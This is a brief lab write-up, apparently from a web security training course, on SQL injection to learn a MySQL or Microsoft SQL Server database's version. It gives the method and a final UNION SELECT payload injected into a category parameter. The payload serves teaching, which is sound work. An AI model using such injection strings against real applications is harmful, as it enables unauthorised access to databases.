# Lab 8: SQL Injection Attack, Querying the Database Type and Version on MySQL and Microsoft

* **Solution**: Use UNION to query @@version, placing it in the second column (string-compatible).
* **Final Payload**: category=Gifts' UNION SELECT NULL, @@version --